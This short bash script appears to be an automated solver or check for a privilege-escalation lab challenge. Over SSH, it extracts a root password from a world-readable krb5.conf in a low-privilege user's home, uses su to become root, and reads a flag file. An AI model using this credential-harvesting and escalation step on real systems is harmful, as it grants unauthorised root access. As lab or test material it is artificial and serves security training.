#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'PASS=$(awk "/root_password/{print \$3}" /home/lowpriv/krb5.conf); printf "%s\n" "$PASS" | su - root -c "cat /root/flag.txt"')"
assert_root_output "${out}"
